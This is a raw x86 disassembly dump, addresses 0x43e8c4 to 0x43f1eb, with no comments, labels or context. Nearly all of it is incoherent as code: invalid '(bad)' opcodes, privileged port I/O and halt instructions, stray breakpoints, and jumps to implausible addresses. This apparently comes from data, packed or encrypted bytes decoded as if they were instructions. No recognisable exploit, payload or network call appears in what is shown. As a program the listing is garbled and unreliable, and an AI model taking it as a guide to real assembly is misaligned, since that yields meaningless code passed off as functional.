  43e8c4:	or     cl,BYTE PTR [ecx+0x56]
  43e8c7:	mov    eax,DWORD PTR [eax]
	...
  43e8e1:	mov    al,0x4a
  43e8e3:	mov    ebx,0xcc9bd9cc
  43e8e8:	int3   
  43e8e9:	jmp    0xda10b589
  43e8ee:	fwait
  43e8ef:	int3   
  43e8f0:	int3   
  43e8f1:	hlt    
  43e8f2:	nop
  43e8f3:	js     0x43e8e1
  43e8f5:	lds    ebx,FWORD PTR [ebx-0x70ff8c88]
  43e8fb:	mov    ebp,0x7bd1b187
  43e900:	repnz mov BYTE PTR [eax+edi*2+0x6924710a],cl
  43e908:	and    eax,0x4ff8117f
  43e90d:	jns    0x43e938
  43e90f:	loopne 0x43e961
  43e911:	outs   dx,DWORD PTR ds:[esi]
  43e912:	and    esp,esi
  43e914:	dec    ebp
  43e915:	inc    esp
  43e916:	or     eax,0xae3813dd
  43e91b:	cmp    eax,0x579c7100
  43e920:	adc    bl,al
  43e922:	mov    cl,0x9
  43e924:	or     eax,0xf882dc34
  43e929:	(bad)  
  43e92b:	add    DWORD PTR ds:0x44655b4,ebp
  43e931:	outs   dx,DWORD PTR ds:[esi]
  43e932:	and    eax,esp
  43e934:	pop    edx
  43e935:	outs   dx,DWORD PTR ds:[esi]
  43e936:	mov    DWORD PTR [edi],edi
  43e938:	mov    ebp,0xccd098c0
  43e93d:	mov    eax,0xb0ccd0a0
  43e942:	icebp  
  43e943:	mov    ah,ch
	...
  43e95d:	add    BYTE PTR ds:0x7388fa,ah
  43e963:	out    dx,eax
  43e964:	ret    
  43e965:	xchg   DWORD PTR [ecx-0x170d78d1],esi
  43e96b:	in     al,dx
  43e96c:	mov    BYTE PTR [edx],cl
  43e96e:	jno    0x43e995
  43e970:	pop    eax
  43e971:	and    eax,0x4ff1717f
  43e976:	jns    0x43e921
  43e978:	fst    DWORD PTR [eax+0x6f]
  43e97b:	mov    eax,ds:0x6ca44ded
  43e980:	ficom  WORD PTR [ebx]
  43e982:	rol    BYTE PTR [esi*8+0x2787f443],0x59
  43e98a:	add    al,0xd2
  43e98c:	cld    
  43e98d:	psubsw mm0,QWORD PTR [edi+eiz*8-0x7a]
  43e992:	or     al,0x2b
  43e994:	jl     0x43e99b
  43e996:	fld    st(4)
  43e998:	jo     0x43e9e4
  43e99a:	clc    
  43e99b:	jge    0x43e949
  43e99d:	fistp  WORD PTR [esi-0x4ebefb83]
  43e9a3:	shl    BYTE PTR [ebx-0x543f4731],0xcf
  43e9aa:	mov    al,0xc0
  43e9ac:	cmp    al,0x8f
  43e9ae:	enter  0xbb85,0xb
  43e9b2:	es jle 0x43e9f1
  43e9b5:	adc    BYTE PTR ds:0xac86ba16,ah
  43e9bb:	shl    DWORD PTR [esi-0x33],1
  43e9be:	mov    ebp,0x57b20d
	...
  43e9db:	aaa    
  43e9dc:	jle    0x43e9cf
  43e9de:	push   ds
  43e9df:	mov    ebp,0xa36dda58
  43e9e4:	sub    BYTE PTR [eax+eiz*8],0x44
  43e9e8:	cmp    bh,BYTE PTR [eax]
  43e9ea:	lea    ecx,[edi]
  43e9ec:	int    0x70
  43e9ee:	pusha  
  43e9ef:	mov    cl,dl
  43e9f1:	aam    0x3
  43e9f3:	repnz inc esp
  43e9f5:	out    0x8c,eax
  43e9f7:	aaa    
  43e9f8:	int    0x66
  43e9fa:	fld    TBYTE PTR [ebp+0x57]
  43e9fd:	pop    es
  43e9fe:	(bad)  
  43e9ff:	das    
  43ea00:	add    esi,esi
  43ea02:	inc    ebx
  43ea03:	hlt    
  43ea04:	sar    DWORD PTR [edx],1
  43ea06:	mov    BYTE PTR [eax+ebx*2],dh
  43ea09:	clc    
  43ea0a:	loop   0x43ea31
  43ea0c:	jnp    0x43e9b7
  43ea0e:	pop    es
  43ea0f:	lods   eax,DWORD PTR ds:[esi]
  43ea10:	test   DWORD PTR [edi],ebp
  43ea12:	loop   0x43e9d5
  43ea14:	mov    esi,0x87b53600
  43ea19:	jecxz  0x43e9a7
  43ea1b:	cmp    al,BYTE PTR [edi+0x357a2143]
  43ea21:	cld    
  43ea22:	mov    esi,0xb4e387b5
  43ea27:	xor    al,al
  43ea29:	int3   
  43ea2a:	sbb    eax,0x35ccc043
  43ea2f:	cmp    eax,eax
  43ea31:	int3   
  43ea32:	sub    eax,0x9cccc033
  43ea37:	push   0xffffffe0
  43ea39:	push   edx
  43ea3a:	bound  ecx,QWORD PTR [ecx+eax*1+0x2d]
  43ea3e:	mov    ebx,0x0
	...
  43ea57:	add    BYTE PTR [ecx-0x43],dh
  43ea5a:	stc    
  43ea5b:	fs mov esi,0xde61fe59
  43ea61:	mov    DWORD PTR [ebx-0xf],ecx
  43ea64:	js     0x43ea4e
  43ea66:	add    BYTE PTR ds:0xf37447cc,bh
  43ea6c:	cs push esp
  43ea6e:	cs jo  0x43ea63
  43ea71:	add    al,0x0
  43ea73:	jmp    0xe8faf318
  43ea78:	test   DWORD PTR [eax+eax*1],0xc721fa92
  43ea7f:	ins    BYTE PTR es:[edi],dx
  43ea80:	bound  ebx,QWORD PTR [ecx+0x22]
  43ea83:	cmp    BYTE PTR [ecx+0x3374103c],al
  43ea89:	stc    
  43ea8a:	dec    edi
  43ea8b:	sbb    dl,cl
  43ea8d:	int    0x13
  43ea8f:	jmp    0x6a43fb15
  43ea94:	push   eax
  43ea95:	into   
  43ea96:	jae    0x43ea8e
  43ea98:	push   esp
  43ea99:	hlt    
  43ea9a:	or     edi,edx
  43ea9c:	mov    bh,0x4
  43ea9e:	xchg   DWORD PTR [edi+0x4ec851f3],ebp
  43eaa4:	mov    dh,0x2b
  43eaa6:	mov    ebp,0x56c44e00
  43eaab:	pop    ebp
  43eaac:	push   cs
  43eaad:	mov    ch,0xcc
  43eaaf:	int3   
  43eab0:	pop    eax
  43eab1:	sub    esp,0x75818a56
  43eab7:	or     al,0x9e
  43eab9:	mov    dl,0xf7
  43eabb:	test   DWORD PTR [eax],eax
	...
  43ead5:	add    ch,BYTE PTR ds:0x870a8b13
  43eadb:	shl    BYTE PTR [esp+edx*1+0x14],0xf7
  43eae0:	adc    eax,0x39d919
  43eae5:	ds scas al,BYTE PTR es:[edi]
  43eae7:	dec    edi
  43eae8:	push   0xd
  43eaea:	in     eax,0xd
  43eaec:	and    BYTE PTR [ecx],dl
  43eaee:	dec    edx
  43eaef:	add    BYTE PTR [ebx-0x74a90467],al
  43eaf5:	fwait
  43eaf6:	inc    ebp
  43eaf7:	push   ebp
  43eaf8:	ret    
  43eaf9:	sbb    BYTE PTR [edx-0xb0f7414],al
  43eaff:	jp     0x43eac9
  43eb01:	mov    dl,0x86
  43eb03:	shl    DWORD PTR [esi+ecx*8-0x80],0x39
  43eb08:	add    al,0xe0
  43eb0a:	leave  
  43eb0b:	int3   
  43eb0c:	int3   
  43eb0d:	xchg   ecx,eax
  43eb0e:	mov    edi,0xbf61cccc
  43eb13:	int3   
  43eb14:	int3   
  43eb15:	push   ecx
  43eb16:	mov    edi,0x81d8cccc
  43eb1b:	in     al,dx
  43eb1c:	mov    ebx,eax
  43eb1e:	add    BYTE PTR [edi+0x3ccd3d00],bh
  43eb24:	add    BYTE PTR [edx+0x43],bl
  43eb27:	add    al,0x0
  43eb29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43eb2a:	dec    eax
  43eb2b:	add    bh,al
  43eb2d:	sbb    eax,0x9e185001
  43eb32:	add    edi,DWORD PTR [edi+0x18a35140]
  43eb38:	inc    ebx
	...
  43eb51:	add    ah,dh
  43eb53:	(bad)  
  43eb55:	inc    eax
  43eb56:	in     al,0xcd
  43eb58:	idiv   BYTE PTR [esp+esi*8]
  43eb5b:	push   ds
  43eb5c:	cmp    eax,0x44e4c414
  43eb61:	add    BYTE PTR [ebx],dh
  43eb63:	popf   
  43eb64:	cmc    
  43eb65:	lahf   
  43eb66:	or     eax,0xb4c0fd9b
  43eb6b:	or     DWORD PTR [eax+eax*1],eax
  43eb6e:	hlt    
  43eb6f:	fnstsw WORD PTR [edx]
  43eb71:	mov    esi,0xccc9ddf0
  43eb76:	inc    eax
  43eb77:	icebp  
  43eb78:	enter  0x38cc,0x19
  43eb7c:	leave  
  43eb7d:	int3   
  43eb7e:	xor    BYTE PTR [ecx],ah
  43eb80:	leave  
  43eb81:	int3   
  43eb82:	sub    BYTE PTR [edx-0x74],ch
  43eb85:	pop    ecx
  43eb86:	adc    BYTE PTR [esi+0x34],dh
  43eb89:	call   0x4814ef
  43eb8e:	outs   dx,DWORD PTR ds:[esi]
  43eb8f:	sub    edi,eax
  43eb91:	test   BYTE PTR [ebx],dh
  43eb93:	int3   
  43eb94:	jle    0x43eb5a
  43eb96:	clc    
  43eb97:	repnz shl DWORD PTR [edx-0xa],cl
  43eb9b:	push   edx
  43eb9c:	aam    0x83
  43eb9e:	retf   0x2c18
  43eba1:	test   DWORD PTR [edi],esi
  43eba3:	lods   al,BYTE PTR ds:[esi]
  43eba4:	xchg   BYTE PTR [ecx+0x0],cl
  43eba7:	div    BYTE PTR [ebx]
  43eba9:	dec    edi
  43ebaa:	pushf  
  43ebab:	nop
  43ebac:	inc    ebx
  43ebad:	add    ah,dh
  43ebaf:	fcom   QWORD PTR [edx+0xc]
  43ebb2:	cmc    
  43ebb3:	jmp    0x0:0xfef3
	...
  43ebce:	add    BYTE PTR [edx],cl
  43ebd0:	fsubr  DWORD PTR [ecx+esi*2]
  43ebd3:	in     al,0x5a
  43ebd5:	enter  0xcd0c,0xca
  43ebd9:	icebp  
  43ebda:	jb     0x43ebce
  43ebdc:	bound  ebp,QWORD PTR ds:0xf3eb7d08
  43ebe2:	pop    ecx
  43ebe3:	iret   
  43ebe4:	add    al,0x26
  43ebe6:	shl    BYTE PTR [eax],1
  43ebe8:	shr    DWORD PTR [ebx],0xd0
  43ebeb:	sub    cl,al
  43ebed:	mov    esp,0x5e37608a
  43ebf2:	pop    ecx
  43ebf3:	cld    
  43ebf4:	xchg   DWORD PTR [ecx],edi
  43ebf6:	vmread ebx,eax
  43ebf9:	out    0x3,eax
  43ebfb:	hlt    
  43ebfc:	jns    0x43eba7
  43ebfe:	push   DWORD PTR [esi-0x3b]
  43ec01:	fiadd  DWORD PTR [edi+0x3e70565]
  43ec07:	lds    edi,FWORD PTR [ecx-0x61]
  43ec0a:	pop    es
  43ec0b:	cdq    
  43ec0c:	int    0xbd
  43ec0e:	push   edi
  43ec0f:	loopne 0x43eb92
  43ec11:	or     cl,BYTE PTR [ecx-0x80]
  43ec14:	and    eax,0x58bbdf66
  43ec19:	lds    eax,FWORD PTR [edx+0x7b29fd]
  43ec1f:	jno    0x43ebef
  43ec21:	adc    BYTE PTR [edi+0xc],0x82
  43ec25:	loop   0x43ec7b
  43ec27:	push   0x82de67f2
  43ec2c:	add    ah,bh
  43ec2e:	add    ecx,DWORD PTR [eax-0x6]
  43ec31:	sub    DWORD PTR [eax+eax*1+0x0],ebx
	...
  43ec4c:	into   
  43ec4d:	int    0xc2
  43ec4f:	ficomp WORD PTR [esi]
  43ec51:	xor    BYTE PTR [ebp+0x2779f407],ah
  43ec57:	or     al,0x77
  43ec59:	les    esi,FWORD PTR [ebx]
  43ec5b:	adc    DWORD PTR [ecx+0x3e],esi
  43ec5e:	retf   
  43ec5f:	xor    edi,DWORD PTR [ecx+0x46]
  43ec62:	iret   
  43ec63:	xor    ebx,DWORD PTR [ebp-0x338994d]
  43ec69:	jns    0x43ec9c
  43ec6b:	add    BYTE PTR [ecx+0x42],dh
  43ec6e:	sub    ecx,DWORD PTR [ecx-0x7513a74c]
  43ec74:	sub    DWORD PTR cs:[eax],eax
  43ec77:	sbb    DWORD PTR [edi+0x42],edi
  43ec7a:	sub    BYTE PTR [ecx],bl
  43ec7c:	dec    ebx
  43ec7d:	mov    ebp,0x87ef2d7d
  43ec82:	push   edx
  43ec83:	std    
  43ec84:	outs   dx,BYTE PTR ds:[esi]
  43ec85:	push   cs
  43ec86:	inc    eax
  43ec87:	ins    BYTE PTR es:[edi],dx
  43ec88:	aaa    
  43ec89:	pop    eax
  43ec8a:	or     esp,DWORD PTR [edx-0x47]
  43ec8d:	sub    BYTE PTR [eax+0x72],dl
  43ec90:	mov    ecx,0x803e501c
  43ec95:	dec    edi
  43ec96:	(bad)  
  43ec9a:	sbb    al,0x62
  43ec9c:	mov    ch,0xc
  43ec9e:	sub    DWORD PTR [ecx],0xffffffcb
  43eca1:	stc    
  43eca2:	test   BYTE PTR [edi-0x507acb2d],ch
  43eca8:	fbstp  TBYTE PTR [ecx+edi*8]
  43ecab:	cmp    BYTE PTR [esi-0x38],dh
  43ecae:	or     BYTE PTR [edx+0x0],dh
	...
  43ecc9:	leave  
  43ecca:	lock test BYTE PTR [edi-0x32b57831],ah
  43ecd1:	and    eax,0x7618f935
  43ecd6:	ror    DWORD PTR [eax],0x1a
  43ecd9:	mov    eax,0xe958f94a
  43ecde:	ja     0x43eca0
  43ece0:	ss mov ecx,0xf7e91c47
  43ece6:	add    al,0x0
  43ece8:	daa    
  43ece9:	xor    BYTE PTR [edx-0x20],cl
  43ecec:	mov    esp,0xe9048afb
  43ecf1:	(bad)  
  43ecf2:	iret   
  43ecf3:	stc    
  43ecf4:	scas   al,BYTE PTR es:[edi]
  43ecf5:	leave  
  43ecf6:	das    
  43ecf7:	pop    ebx
  43ecf8:	stos   DWORD PTR es:[edi],eax
  43ecf9:	in     al,dx
  43ecfa:	add    al,0xcc
  43ecfc:	lods   eax,DWORD PTR ds:[esi]
  43ecfd:	les    edi,FWORD PTR [ecx+0x13a62cc]
  43ed03:	push   ecx
  43ed04:	bound  ebp,QWORD PTR [eax-0x7cff08ee]
  43ed0a:	push   es
  43ed0b:	cmp    ecx,0x10
  43ed0e:	stos   BYTE PTR es:[edi],al
  43ed0f:	ins    DWORD PTR es:[edi],dx
  43ed10:	add    al,0xae
  43ed12:	enter  0xc357,0x36
  43ed16:	rol    DWORD PTR [ecx-0x182aeba],0x56
  43ed1d:	popf   
  43ed1e:	adc    eax,0x89dade8
  43ed23:	add    BYTE PTR [ebx+0x4184cc6b],cl
  43ed29:	push   ebp
  43ed2a:	test   esp,eax
  43ed2c:	or     al,0x0
	...
  43ed46:	into   
  43ed47:	test   al,0xf9
  43ed49:	je     0x43ed9d
  43ed4b:	jge    0x43ed9b
  43ed4d:	xor    BYTE PTR [edx+0x31e84a15],al
  43ed53:	jmp    0x7df8:0xea0cffff
  43ed5a:	adc    eax,0x96303e7f
  43ed5f:	rcl    DWORD PTR [edi-0x3d],0x8e
  43ed63:	test   al,0xfa
  43ed65:	je     0x43ed72
  43ed67:	jge    0x43eda7
  43ed69:	xor    BYTE PTR [edx-0x3a17afec],dl
  43ed6f:	and    DWORD PTR [eax],eax
  43ed71:	add    BYTE PTR [edx+eax*2+0x30],ah
  43ed75:	add    ebx,edi
  43ed77:	pop    es
  43ed78:	jbe    0x43ed82
  43ed7a:	push   esi
  43ed7b:	rcl    DWORD PTR [edi-0x3d],0x69
  43ed7f:	mov    ebx,0xbb89cccc
  43ed84:	int3   
  43ed85:	int3   
  43ed86:	mov    DWORD PTR [ebx+0x7e10cccc],edi
  43ed8c:	in     al,dx
  43ed8d:	push   ecx
  43ed8e:	push   cs
  43ed8f:	jle    0x43ede8
  43ed91:	sub    al,0xe3
  43ed93:	jg     0x43edea
  43ed95:	cld    
  43ed96:	xchg   BYTE PTR [edx],al
  43ed98:	cmp    edi,0xfffffff4
  43ed9b:	data16 cmp bh,ah
  43ed9e:	jg     0x43ed92
  43eda0:	pop    ds
  43eda1:	and    eax,0x4188ca0b
  43eda6:	or     BYTE PTR [edi+0x4c],dl
  43eda9:	sub    al,0x0
	...
  43edc3:	sub    DWORD PTR [ecx],0x5a6af608
  43edc9:	fsub   QWORD PTR ds:0x6ebe2664
  43edcf:	mov    ecx,0xa7384456
  43edd4:	pusha  
  43edd5:	or     DWORD PTR [eax],ebx
  43edd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43edd8:	(bad)  
  43edd9:	in     eax,0x22
  43eddb:	mov    ah,0xdd
  43eddd:	std    
  43edde:	test   BYTE PTR [ebx-0x47be7767],ah
  43ede4:	add    al,0x3b
  43ede6:	jo     0x43edc5
  43ede8:	jp     0x43ee53
  43edea:	jge    0x43ee24
  43edec:	shl    DWORD PTR [esi],1
  43edee:	pop    ecx
  43edef:	mov    eax,0x64500958
  43edf4:	loop   0x43ed8a
  43edf6:	aas    
  43edf7:	or     bl,BYTE PTR [esi-0x1a]
  43edfa:	(bad)  
  43edfb:	mov    esi,0xcf044f1e
  43ee00:	push   ds
  43ee01:	call   0x47601504
  43ee06:	bound  edi,QWORD PTR [ebp-0x23]
  43ee09:	push   edx
  43ee0a:	out    0x6f,eax
  43ee0c:	adc    eax,DWORD PTR [ebp+eax*4-0x39]
  43ee10:	pop    ecx
  43ee11:	or     BYTE PTR [edi+0x64],dl
  43ee14:	jecxz  0x43eda4
  43ee16:	aas    
  43ee17:	retf   0xeb5f
  43ee1a:	(bad)  
  43ee1b:	(bad)  
  43ee1c:	sahf   
  43ee1d:	push   edx
  43ee1e:	add    al,0xf
  43ee20:	lahf   
  43ee21:	jmp    0x4adfd524
  43ee26:	bound  eax,QWORD PTR [eax]
	...
  43ee40:	jge    0x43ee1f
  43ee42:	push   eax
  43ee43:	out    0xf7,eax
  43ee45:	add    al,0x96
  43ee47:	(bad)  
  43ee48:	cmc    
  43ee49:	test   DWORD PTR [edi],ebx
  43ee4b:	add    ah,dh
  43ee4d:	stc    
  43ee4e:	push   0xffffff94
  43ee50:	hlt    
  43ee51:	add    al,0xe7
  43ee53:	mov    ds,WORD PTR ds:0x83ae651
  43ee59:	jle    0x43ee04
  43ee5b:	pop    es
  43ee5c:	int    0xc
  43ee5e:	pop    esi
  43ee5f:	aam    0x5c
  43ee61:	fsubr  QWORD PTR [ecx-0x25]
  43ee64:	pop    ebp
  43ee65:	add    al,0xaa
  43ee67:	dec    edi
  43ee68:	jno    0x43eeac
  43ee6a:	ror    DWORD PTR [esi+0x3f99185],cl
  43ee70:	hlt    
  43ee71:	ja     0x43ee66
  43ee73:	add    ecx,eax
  43ee75:	into   
  43ee76:	out    0x55,al
  43ee78:	(bad)  
  43ee79:	jge    0x43ee0d
  43ee7b:	addr16 jns 0x43eea8
  43ee7e:	out    dx,eax
  43ee7f:	mov    ?,WORD PTR [ebp-0x124e01d4]
  43ee85:	xchg   edx,eax
  43ee86:	jmp    0x43ee7e
  43ee88:	jb     0x43eecc
  43ee8a:	scas   eax,DWORD PTR es:[edi]
  43ee8b:	mov    dh,0x14
  43ee8d:	cli    
  43ee8e:	pop    eax
  43ee8f:	dec    eax
  43ee90:	stc    
  43ee91:	add    edx,esi
  43ee93:	(bad)
  43ee97:	mov    WORD PTR [ebp+0x68d2643c],?
  43ee9d:	xor    eax,0x7e3c535e
  43eea2:	call   0x0:0x3b
	...
  43eebd:	jns    0x43ef00
  43eebf:	pop    ds
  43eec0:	or     esp,DWORD PTR [esi+0x7905f740]
  43eec6:	sub    DWORD PTR [edi],esp
  43eec8:	mov    bh,0xd6
  43eeca:	jge    0x43eee6
  43eecc:	inc    eax
  43eecd:	adc    ebx,eax
  43eecf:	push   es
  43eed0:	inc    ebx
  43eed1:	and    BYTE PTR [esi+0x32],bh
  43eed4:	adc    BYTE PTR [ebx+0x41],bh
  43eed7:	add    BYTE PTR [ecx],ah
  43eed9:	push   ss
  43eeda:	add    BYTE PTR [eax+ebp*1],0xdb
  43eede:	fisub  DWORD PTR [edx+0x70]
  43eee1:	fwait
  43eee2:	pop    eax
  43eee3:	test   DWORD PTR [esi],ebp
  43eee5:	inc    eax
  43eee6:	add    BYTE PTR [ecx+0x2d],0x16
  43eeea:	adc    BYTE PTR [ecx+eiz*1],0x9f
  43eeee:	jnp    0x43eea4
  43eef0:	fcomip st,st(7)
  43eef2:	add    al,0x85
  43eef4:	xor    si,0xffff
  43eef8:	call   0xeab82a77
  43eefd:	das    
  43eefe:	or     bh,BYTE PTR [ebp+0x60]
  43ef01:	repnz pop edx
  43ef03:	add    al,0x64
  43ef05:	aaa    
  43ef06:	push   ebp
  43ef07:	mov    al,0x68
  43ef09:	scas   al,BYTE PTR es:[edi]
  43ef0a:	push   eax
  43ef0b:	add    ch,al
  43ef0d:	test   DWORD PTR [ebp*2+0x7cf36af5],0xac933c3
  43ef18:	ins    BYTE PTR es:[edi],dx
  43ef19:	cmp    cl,dh
  43ef1b:	stc    
  43ef1c:	cs jb  0x43eea2
  43ef1f:	sar    bh,0x0
	...
  43ef3a:	test   DWORD PTR [eax*4-0x40f01452],0x717f969a
  43ef45:	xchg   ebp,eax
  43ef46:	cli    
  43ef47:	push   ebx
  43ef48:	ins    BYTE PTR es:[edi],dx
  43ef49:	ret    0x5735
  43ef4c:	sub    dl,dl
  43ef4e:	mov    ebp,0xca68d782
  43ef53:	mov    DWORD PTR [eax],0x352f7e9
  43ef59:	mov    ds:0xe9f9c7f2,al
  43ef5e:	add    BYTE PTR [esi+0x38],0xea
  43ef62:	mov    ch,0x3a
  43ef64:	push   eax
  43ef65:	shl    ebp,0xd
  43ef68:	add    BYTE PTR [eax],al
  43ef6a:	int    0x81
  43ef6c:	les    ecx,FWORD PTR [eax]
  43ef6e:	sahf   
  43ef6f:	mov    ss,WORD PTR [esi-0x77]
  43ef72:	inc    edx
  43ef73:	ror    DWORD PTR [esi],0x0
  43ef76:	lea    ecx,[ecx]
  43ef78:	and    ebp,0x30
  43ef7b:	ret    0x9685
  43ef7e:	lahf   
  43ef7f:	add    eax,DWORD PTR [eax]
  43ef81:	add    BYTE PTR [esi-0x49da943e],ah
  43ef87:	mov    ah,0x79
  43ef89:	(bad)  
  43ef8a:	pop    DWORD PTR [ebx]
  43ef8c:	add    BYTE PTR [eax],al
  43ef8e:	inc    esi
  43ef8f:	mov    esp,0x26bf133
  43ef94:	xor    ecx,0xffffffd6
  43ef97:	cmp    eax,0x13250338
  43ef9c:	dec    ecx
  43ef9d:	call   0x43efa2
	...
  43efb6:	add    BYTE PTR ds:0xdeffffeb,cl
  43efbc:	les    ecx,FWORD PTR [eax]
  43efbe:	add    DWORD PTR [edx-0x3f],ebp
  43efc1:	push   cs
  43efc2:	add    BYTE PTR [ebp+0xe],cl
  43efc5:	push   ebx
  43efc6:	mov    edi,DWORD PTR [eax-0x773344f1]
  43efcc:	jns    0x43efba
  43efce:	push   ecx
  43efcf:	mov    edi,DWORD PTR [ecx+0x6d]
  43efd2:	or     BYTE PTR [esi-0x227cf3be],ah
  43efd8:	test   eax,0xb058c74f
  43efdd:	idiv   edi
  43efdf:	or     eax,0xf2ff3504
  43efe4:	add    BYTE PTR [eax],al
  43efe6:	jae    0x43efc6
  43efe8:	jp     0x43f027
  43efea:	cld    
  43efeb:	push   esi
  43efec:	inc    ebx
  43efed:	je     0x43ef72
  43efef:	in     eax,0x2
  43eff1:	outs   dx,DWORD PTR ds:[esi]
  43eff2:	adc    ah,BYTE PTR [esi-0x52]
  43eff5:	call   0xf7f0a30b
  43effa:	mov    esi,esp
  43effc:	pop    ss
  43effd:	push   eax
  43effe:	xor    DWORD PTR [esi+eiz*4-0x220b5787],0xfffffffd
  43f006:	(bad)  
  43f007:	cmp    DWORD PTR [edx],edi
  43f009:	mov    ecx,DWORD PTR [edx+0x48]
  43f00c:	arpl   WORD PTR [edx],di
  43f00e:	cld    
  43f00f:	outs   dx,DWORD PTR ds:[esi]
  43f010:	out    dx,eax
  43f011:	shl    DWORD PTR [bp+si],0xea
  43f015:	add    eax,DWORD PTR [eax]
  43f017:	hlt    
  43f018:	fld    QWORD PTR [edx+0x4]
	...
  43f032:	add    BYTE PTR [eax],al
  43f034:	cmc    
  43f035:	jmp    0xebe82539
  43f03a:	adc    al,0x25
  43f03c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f03d:	push   esp
  43f03e:	das    
  43f03f:	je     0x43f0be
  43f041:	pop    ds
  43f042:	push   0xd53d83
  43f047:	test   edx,ecx
  43f049:	xchg   ebp,eax
  43f04a:	add    al,0xcf
  43f04c:	dec    edi
  43f04d:	fist   DWORD PTR [esi+ecx*8]
  43f050:	(bad)  
  43f052:	sub    al,0xbf
  43f054:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f055:	mov    ebp,DWORD PTR [edi]
  43f057:	call   0x47e4d9
  43f05c:	outs   dx,DWORD PTR ds:[esi]
  43f05d:	(bad)  
  43f05e:	popa   
  43f05f:	test   edx,esi
  43f061:	pop    edx
  43f062:	mov    ecx,0x319f7d10
  43f067:	call   0xfa1c0a69
  43f06c:	outs   dx,DWORD PTR ds:[esi]
  43f06d:	mov    DWORD PTR [esi+esi*2+0x4549dde4],0x85319f7f
  43f078:	stos   BYTE PTR es:[edi],al
  43f079:	dec    ecx
  43f07a:	mov    WORD PTR [edx-0x38],es
  43f07d:	mov    dl,0xae
  43f07f:	sub    edi,edx
  43f081:	fdiv   st(5),st
  43f083:	jmp    FWORD PTR [edi]
  43f085:	in     al,dx
  43f086:	pop    es
  43f087:	jle    0x43f0e6
  43f089:	xlat   BYTE PTR ds:[ebx]
  43f08a:	sar    ecx,1
  43f08c:	jno    0x43f093
  43f08e:	mov    al,0x5c
  43f090:	cmc    
  43f091:	jns    0x43f0b4
  43f093:	sbb    al,0xc9
  43f095:	lds    edi,FWORD PTR [esi+0x2]
	...
  43f0af:	add    BYTE PTR [eax],al
  43f0b1:	adc    ebp,eax
  43f0b3:	cmp    eax,0x19352a04
  43f0b8:	in     al,dx
  43f0b9:	and    cl,BYTE PTR [edi+eiz*8]
  43f0bc:	add    esi,DWORD PTR [ecx+0x37]
  43f0bf:	inc    ebx
  43f0c0:	mov    ebx,esi
  43f0c2:	and    DWORD PTR [ebx+0x433772f4],0x9acac2ec
  43f0cc:	xlat   BYTE PTR ds:[ebx]
  43f0cd:	jno    0x43f0be
  43f0cf:	gs pop edx
  43f0d1:	in     al,0x4
  43f0d3:	fiadd  DWORD PTR [eax-0x287d39ca]
  43f0d9:	int    0x11
  43f0db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f0dc:	ss jno 0x43f0bf
  43f0df:	adc    al,0xc3
  43f0e1:	jns    0x43f123
  43f0e3:	fild   DWORD PTR [eax-0x40a7aecc]
  43f0e9:	jbe    0x43f07c
  43f0eb:	icebp  
  43f0ec:	add    esi,esp
  43f0ee:	add    al,0xe7
  43f0f0:	add    esi,esp
  43f0f2:	or     DWORD PTR [edi+0x0],0x466e42c7
  43f0f9:	sar    BYTE PTR [edi+0x30],1
  43f0fc:	pop    esp
  43f0fd:	cmc    
  43f0fe:	jns    0x43f0a9
  43f100:	sbb    esp,DWORD PTR [ecx]
  43f102:	lds    edi,FWORD PTR [esi]
  43f104:	add    cl,cl
  43f106:	les    ebp,FWORD PTR [esi+0x2e]
  43f109:	mov    al,ds:0x3b2ae85a
  43f10e:	xor    esi,DWORD PTR [edi-0x3013f3d3]
  43f114:	add    eax,DWORD PTR [eax]
	...
  43f12e:	hlt    
  43f12f:	jns    0x43f0da
  43f131:	addr16 jns 0x43f13a
  43f134:	data16 rol BYTE PTR [esp+edi*2],0x0
  43f139:	scas   eax,DWORD PTR es:[edi]
  43f13a:	sub    ebx,ebp
  43f13c:	ja     0x43f130
  43f13e:	ret    0x85cb
  43f141:	mul    esi
  43f143:	les    esi,FWORD PTR [edi]
  43f145:	sub    al,al
  43f147:	sub    al,0x9
  43f149:	jl     0x43f102
  43f14b:	sub    bh,BYTE PTR [ebp-0x57]
  43f14e:	cmc    
  43f14f:	jg     0x43f134
  43f151:	and    al,0xb7
  43f153:	jg     0x43f197
  43f155:	dec    ebp
  43f156:	jg     0x43f18a
  43f158:	pop    esp
  43f159:	repnz mov ch,0x4a
  43f15c:	xor    esp,DWORD PTR [ebp+eiz*2+0x4c]
  43f160:	add    DWORD PTR [edx+0x39],esi
  43f163:	or     eax,0xc69eb2fd
  43f168:	mov    al,cs:0xab25050d
  43f16e:	(bad)  
  43f16f:	xor    eax,0xca69152
  43f174:	add    cl,ch
  43f176:	jle    0x43f1aa
  43f178:	ins    BYTE PTR es:[edi],dx
  43f179:	bound  ecx,QWORD PTR [ecx]
  43f17b:	dec    eax
  43f17c:	(bad)  
  43f17d:	fldcw  WORD PTR [eax+0x32]
  43f180:	pop    esp
  43f181:	push   ecx
  43f182:	out    0xcf,al
  43f184:	stc    
  43f185:	pop    esi
  43f186:	jle    0x43f18a
  43f188:	jge    0x43f15b
  43f18a:	inc    edi
  43f18b:	lds    ecx,FWORD PTR [edx]
  43f18d:	gs ror bl,1
  43f190:	stc    
  43f191:	inc    esi
	...
  43f1aa:	add    dl,ch
  43f1ac:	mov    edi,?
  43f1ae:	call   0x629df6aa
  43f1b3:	adc    al,0x29
  43f1b5:	mov    ebp,0xccb8331d
  43f1ba:	xor    eax,0x2dccb83b
  43f1bf:	xor    edi,DWORD PTR [eax-0x27914334]
  43f1c5:	dec    ebp
  43f1c6:	mov    bh,0x6e
  43f1c8:	push   ecx
  43f1c9:	or     BYTE PTR [eax],al
  43f1cb:	xchg   edx,eax
  43f1cc:	lahf   
  43f1cd:	stc    
  43f1ce:	(bad)  
  43f1cf:	fisttp QWORD PTR [eax]
  43f1d1:	cmp    edi,0x56
  43f1d4:	add    dh,BYTE PTR [ebp+edi*1-0x2d]
  43f1d8:	or     DWORD PTR [eax],eax
  43f1da:	add    BYTE PTR [esi],ch
  43f1dc:	out    0x82,al
  43f1de:	(bad)  
  43f1df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f1e0:	mov    bh,ah
  43f1e2:	jmp    FWORD PTR [edx-0x178bc172]
  43f1e8:	ret    0xfffa
  43f1eb:	popf   
